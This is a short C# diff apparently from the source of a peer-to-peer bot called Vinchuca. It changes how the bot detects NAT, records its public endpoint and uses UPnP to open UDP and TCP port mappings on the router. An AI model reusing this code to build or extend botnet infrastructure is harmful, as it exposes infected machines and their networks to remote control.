@@ -59,7 +59,7 @@ namespace Vinchuca
             _peerList.DesparadoModeActivated += DesperateModeActivated;
 
 
-            if (IPAddressUtils.BehingNAT())
+            if (IPAddressUtils.BehingNAT(IPAddressUtils.GetLocalIPAddress()))
             {
                 var upnpSearcher = new UpnpSearcher();
                 upnpSearcher.DeviceFound += (s, e) =>
@@ -69,6 +69,7 @@ namespace Vinchuca
                     try
                     {
                         var externalPort = BotIdentifier.Id.GetPort();
+                        BotIdentifier.EndPoint = new IPEndPoint(PublicIP, externalPort);
                         var device = e.Device;
                         device.CreatePortMap(new Mapping(Protocol.Udp, port, externalPort));
                         device.CreatePortMap(new Mapping(Protocol.Tcp, port, externalPort + 1));
